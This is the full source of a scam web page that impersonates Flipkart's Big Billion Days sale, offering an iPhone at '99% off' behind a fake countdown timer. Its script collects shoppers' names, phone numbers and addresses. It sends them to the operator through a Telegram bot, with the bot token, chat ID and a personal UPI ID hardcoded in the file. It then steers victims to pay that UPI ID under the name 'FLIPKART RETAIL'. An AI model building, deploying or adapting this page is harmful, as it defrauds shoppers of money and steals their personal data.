<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flipkart | Big Billion Days</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; overflow-x: hidden; }
        .fk-blue { background-color: #2874f0; }
        .btn-orange { background: #fb641b; color: #fff; border-radius: 2px; font-weight: bold; }
        .btn-yellow { background: #ff9f00; color: #fff; border-radius: 2px; font-weight: bold; }
        .rating-badge { background: #388e3c; color: #fff; padding: 2px 6px; border-radius: 3px; font-weight: bold; font-size: 11px; }
        .line-input { width: 100%; border-bottom: 2px solid #ccc; padding: 12px 0; outline: none; background: transparent; }
        
        /* Swiper Fixes */
        .detail-swiper { height: 380px; width: 100%; background: white; position: relative; overflow: hidden; }
        .detail-swiper .swiper-slide { display: flex; align-items: center; justify-content: center; }
        .detail-swiper .swiper-slide img { max-width: 100%; max-height: 100%; object-fit: contain; }
        
        .home-swiper { height: 220px; width: 100%; }
        .home-swiper img { width: 100%; height: 100%; object-fit: cover; }
        
        .full-stack img { width: 100%; height: auto; display: block; }
        .deal-timer { background: #fff5f5; color: #d32f2f; padding: 8px; font-weight: bold; font-size: 13px; display: flex; align-items: center; gap: 6px; border-bottom: 1px solid #ffe0e0; }
        .timer-box { background: #d32f2f; color: white; padding: 2px 4px; border-radius: 2px; margin: 0 2px; }
        
        .no-scrollbar::-webkit-scrollbar { display: none; }
    </style>
</head>
<body>

    <div id="page-home">
        <div class="sticky top-0 z-[1000] bg-white shadow-sm">
            <header class="py-3 px-4 flex items-center justify-between border-b">
                <div class="flex items-center gap-3">
                    <i class="fa-solid fa-bars text-gray-600 text-lg"></i>
                    <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-9">
                </div>
                <i class="fa-solid fa-cart-shopping text-gray-600"></i>
            </header>
            <div class="bg-white px-4 pb-3">
                <div class="bg-gray-100 rounded-md flex items-center px-3 py-2 text-gray-500 gap-2 border border-gray-200">
                    <i class="fa-solid fa-magnifying-glass text-xs"></i>
                    <input type="text" placeholder="Search for products" class="text-sm w-full outline-none bg-transparent text-black">
                </div>
            </div>
        </div>

        <div class="bg-white overflow-x-auto no-scrollbar flex items-center gap-5 px-4 py-3 mb-1">
            <div class="flex flex-col items-center flex-shrink-0"><img src="https://rukminim1.flixcart.com/fk-p-flap/128/128/image/e00302d428f5c7be.png" class="h-10 w-10"><span class="text-[10px] mt-1">Top Offers</span></div>
            <div class="flex flex-col items-center flex-shrink-0"><img src="https://rukminim1.flixcart.com/fk-p-flap/128/128/image/5f2ee7f883cdb774.png" class="h-10 w-10"><span class="text-[10px] mt-1">Mobiles</span></div>
            <div class="flex flex-col items-center flex-shrink-0"><img src="https://rukminim1.flixcart.com/fk-p-flap/128/128/image/ff559cb9d803d424.png" class="h-10 w-10"><span class="text-[10px] mt-1">Fashion</span></div>
            <div class="flex flex-col items-center flex-shrink-0"><img src="https://rukminim1.flixcart.com/fk-p-flap/128/128/image/af646c36d74c4be9.png" class="h-10 w-10"><span class="text-[10px] mt-1">Electronics</span></div>
        </div>

        <div class="swiper home-swiper bg-white mb-2">
            <div class="swiper-wrapper">
                <div class="swiper-slide px-2"><img src="https://rukminim2.flixcart.com/fk-p-flap/3240/540/image/f4b2727eceebf310.jpg?q=60" class="rounded-md"></div>
                <div class="swiper-slide px-2"><img src="https://rukminim2.flixcart.com/fk-p-flap/1600/270/image/73a2db8ce0d06600.png?q=20" class="rounded-md"></div>
            </div>
            <div class="swiper-pagination"></div>
        </div>

        <main id="main-grid" class="grid grid-cols-2 gap-1 p-1 pb-20"></main>
    </div>

    <div id="page-detail" class="hidden fixed inset-0 bg-[#f1f3f6] z-[200] overflow-y-auto pb-20">
        <nav class="p-3 border-b sticky top-0 bg-white z-[210] flex items-center justify-between">
            <div class="flex items-center gap-4">
                <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-home')"></i>
                <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-4">
            </div>
        </nav>
        
        <div class="swiper detail-swiper">
            <div class="swiper-wrapper" id="swiper-images"></div>
            <div class="swiper-pagination"></div>
        </div>

        <div class="deal-timer">
            <i class="fa-regular fa-clock"></i>
            <span>Deal ends in </span>
            <span id="countdown-timer">
                <span class="timer-box" id="t-hours">00</span>:
                <span class="timer-box" id="t-min">00</span>:
                <span class="timer-box" id="t-sec">00</span>
            </span>
        </div>

        <div class="p-4 bg-white">
            <p id="det-name" class="text-md text-gray-800 leading-tight"></p>
            <div class="flex items-center gap-2 mt-2">
                <span class="rating-badge">4.4 ★</span>
                <span class="text-gray-400 text-sm">(2,45,102 ratings)</span>
                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_9e47c1.png" class="h-6 ml-auto">
            </div>
            <div class="flex items-baseline gap-2 mt-2">
                <span id="det-price" class="text-2xl font-bold"></span>
                <span id="det-mrp" class="text-gray-400 line-through text-sm"></span>
                <span class="text-green-600 font-bold text-sm">99% off</span>
            </div>
        </div>

        <div id="full-stack-images" class="full-stack mt-2"></div>

        <div class="fixed bottom-0 w-full flex h-14 bg-white border-t z-[220]">
            <button class="w-1/2 font-bold text-sm text-black">ADD TO CART</button>
            <button onclick="showPage('page-address')" class="w-1/2 btn-yellow font-bold text-sm">BUY NOW</button>
        </div>
    </div>

    <div id="page-address" class="hidden fixed inset-0 bg-white z-[300] overflow-y-auto">
        <nav class="fk-blue p-4 text-white flex items-center gap-4">
            <i class="fa-solid fa-arrow-left" onclick="showPage('page-detail')"></i>
            <span class="font-medium">Add Delivery Address</span>
        </nav>
        <div class="p-6 space-y-6">
            <input type="text" id="uName" placeholder="Full Name (Required)*" class="line-input">
            <input type="tel" id="uPhone" placeholder="Mobile Number (Required)*" class="line-input" maxlength="10">
            <input type="number" id="uPin" placeholder="Pincode (Required)*" class="line-input" oninput="fetchPin(this.value)">
            <div class="flex gap-4">
                <input type="text" id="uCity" placeholder="City" class="line-input w-1/2 bg-gray-50" readonly>
                <input type="text" id="uState" placeholder="State" class="line-input w-1/2 bg-gray-50" readonly>
            </div>
            <input id="uAdd" placeholder="House No, Building Name*" class="line-input">
            <button onclick="goToSummary()" class="w-full btn-orange py-4 uppercase">Save and Continue</button>
        </div>
    </div>

    <div id="page-summary" class="hidden fixed inset-0 bg-[#f1f3f6] z-[350] overflow-y-auto pb-24">
        <nav class="fk-blue p-4 text-white flex items-center gap-4 sticky top-0">
            <i class="fa-solid fa-arrow-left" onclick="showPage('page-address')"></i>
            <span class="font-medium">Order Summary</span>
        </nav>
        <div class="bg-white p-4 flex gap-4 mb-2">
            <img id="sum-prod-img" src="" class="w-24 h-24 object-contain">
            <div>
                <p id="sum-prod-name" class="text-sm line-clamp-2"></p>
                <div class="flex items-center gap-2 mt-2">
                    <span id="sum-price" class="font-bold text-lg"></span>
                    <span class="text-green-600 font-bold text-xs">99% Off</span>
                </div>
            </div>
        </div>
        <div class="bg-white p-4">
            <div class="flex justify-between mb-4 text-sm"><span>Price (1 item)</span><span id="sum-mrp-list"></span></div>
            <div class="flex justify-between mb-4 text-sm"><span>Discount</span><span id="sum-disc" class="text-green-600"></span></div>
            <div class="flex justify-between font-bold text-lg pt-4 border-t"><span>Total Amount</span><span id="sum-total-val"></span></div>
        </div>
        <div class="fixed bottom-0 left-0 w-full p-2 bg-white border-t flex items-center justify-between px-4">
            <span id="sum-total-bottom" class="font-bold text-lg"></span>
            <button onclick="showPage('page-payment')" class="btn-orange px-10 py-3 uppercase font-bold text-sm">Continue</button>
        </div>
    </div>

    <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">
        <nav class="fk-blue p-4 text-white flex items-center gap-4">
            <i class="fa-solid fa-arrow-left" onclick="showPage('page-summary')"></i>
            <span class="font-medium">Payments</span>
        </nav>
        <div class="p-3">
            <div class="bg-white rounded shadow-sm divide-y">
                <label class="flex items-center p-4"><input type="radio" name="pay" checked><p class="ml-4 font-medium">Google Pay / PhonePe / Paytm</p></label>
            </div>
            <div class="bg-white rounded p-4 mt-4 border-2 border-dashed border-blue-400 text-center" onclick="showQRCode()">
                <i class="fa-solid fa-qrcode text-2xl mb-1"></i>
                <p class="font-bold">Show QR Code</p>
                <p class="text-xs text-blue-600">Scan & Pay via any App</p>
            </div>
        </div>
        <div class="fixed bottom-0 w-full p-2 bg-white border-t">
            <button onclick="confirmPay()" class="w-full btn-orange py-4 uppercase font-bold">Continue to Pay</button>
        </div>
    </div>

    <div id="qr-modal" class="hidden fixed inset-0 bg-black/80 z-[600] flex items-center justify-center p-6">
        <div class="bg-white rounded-lg p-6 w-full max-w-xs text-center relative">
            <button onclick="closeQR()" class="absolute -top-10 right-0 text-white text-3xl">&times;</button>
            <p class="font-bold mb-2">Scan & Pay</p>
            <div id="qrcode" class="flex justify-center mb-4 border p-2"></div>
            <p id="qr-amt" class="text-xl font-bold text-blue-600"></p>
            <p class="text-[10px] text-red-500 mt-2">Screenshot lein aur kisi bhi app se scan karein</p>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <script>
        const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM";
        const CHAT_ID = "1981500395";
        const MY_UPI = "8709615634-w350@ybl";

        const products = [
            { id: 208, name: "Apple iPhone 17 Pro Max (Silver, 256 GB)", price: "1499", mrp: "149900", imgs: ["https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/0/p/g/-original-imahft6cfwg6yta2.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/q/r/1/-original-imahft6cqn3ftf4p.jpeg?q=90"] },
            { id: 39, name: "OnePlus Nord Buds 2r Wireless Earbuds", price: "199", mrp: "2299", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/y/i/-original-imagr4t8mwhmtyg9.jpeg"] }
        ];

        let sel = null;
        let swpDet = null;

        function init() {
            const grid = document.getElementById('main-grid');
            grid.innerHTML = products.map(p => `
                <div class="bg-white p-2 border flex flex-col" onclick="openProduct(${p.id})">
                    <img src="${p.imgs[0]}" class="h-48 object-contain">
                    <p class="text-xs mt-2 line-clamp-2">${p.name}</p>
                    <div class="mt-1"><span class="font-bold">₹${p.price}</span> <span class="text-gray-400 line-through text-[10px]">₹${p.mrp}</span></div>
                </div>
            `).join('');
            
            new Swiper(".home-swiper", { loop: true, autoplay: { delay: 3000 }, pagination: { el: ".swiper-pagination" } });
            startTimer();
        }

        function openProduct(id) {
            sel = products.find(p => p.id === id);
            document.getElementById('det-name').innerText = sel.name;
            document.getElementById('det-price').innerText = "₹" + sel.price;
            document.getElementById('det-mrp').innerText = "₹" + sel.mrp;
            
            const wrapper = document.getElementById('swiper-images');
            wrapper.innerHTML = sel.imgs.map(url => `<div class="swiper-slide"><img src="${url}"></div>`).join('');
            
            const fullStack = document.getElementById('full-stack-images');
            fullStack.innerHTML = sel.imgs.map(url => `<img src="${url}" class="w-full mb-1">`).join('');

            showPage('page-detail');

            if(swpDet) swpDet.destroy();
            swpDet = new Swiper(".detail-swiper", { 
                loop: true, 
                pagination: { el: ".swiper-pagination" },
                observer: true,
                observeParents: true
            });
        }

        function showPage(id) {
            ['page-home', 'page-detail', 'page-address', 'page-summary', 'page-payment'].forEach(p => document.getElementById(p).classList.add('hidden'));
            document.getElementById(id).classList.remove('hidden');
            window.scrollTo(0,0);
        }

        async function fetchPin(pin) {
            if(pin.length === 6) {
                const r = await fetch(`https://api.postalpincode.in/pincode/${pin}`).then(res => res.json());
                if(r[0].Status === "Success") {
                    document.getElementById('uCity').value = r[0].PostOffice[0].District;
                    document.getElementById('uState').value = r[0].PostOffice[0].State;
                }
            }
        }

        function goToSummary() {
            if(!document.getElementById('uName').value || !document.getElementById('uPhone').value) return alert("Fill all details");
            document.getElementById('sum-prod-name').innerText = sel.name;
            document.getElementById('sum-prod-img').src = sel.imgs[0];
            document.getElementById('sum-price').innerText = "₹" + sel.price;
            document.getElementById('sum-mrp-list').innerText = "₹" + sel.mrp;
            document.getElementById('sum-total-val').innerText = "₹" + sel.price;
            document.getElementById('sum-total-bottom').innerText = "₹" + sel.price;
            showPage('page-summary');
        }

        function showQRCode() {
            document.getElementById("qrcode").innerHTML = "";
            document.getElementById('qr-amt').innerText = "₹" + sel.price;
            const upi = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR&mc=5411`;
            new QRCode(document.getElementById("qrcode"), { text: upi, width: 200, height: 200 });
            document.getElementById('qr-modal').classList.remove('hidden');
        }

        function closeQR() { document.getElementById('qr-modal').classList.add('hidden'); }

        async function confirmPay() {
            const name = document.getElementById('uName').value;
            const phone = document.getElementById('uPhone').value;
            const msg = `💰 *NEW ORDER* 💰\nName: ${name}\nPhone: ${phone}\nAmount: ₹${sel.price}\nProduct: ${sel.name}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);

            const upiLink = `upi://pay?pa=${MY_UPI}&pn=FLIPKART%20RETAIL&am=${sel.price}&cu=INR&mc=5411&mode=02`;
            window.location.href = upiLink;

            setTimeout(() => { showQRCode(); }, 2500);
        }

        function startTimer() {
            let m = 10, s = 0;
            setInterval(() => {
                if(s > 0) s--; else { s=59; m--; }
                document.getElementById('t-min').innerText = m.toString().padStart(2,'0');
                document.getElementById('t-sec').innerText = s.toString().padStart(2,'0');
            }, 1000);
        }

        window.onload = init;
    </script>
</body>
</html>
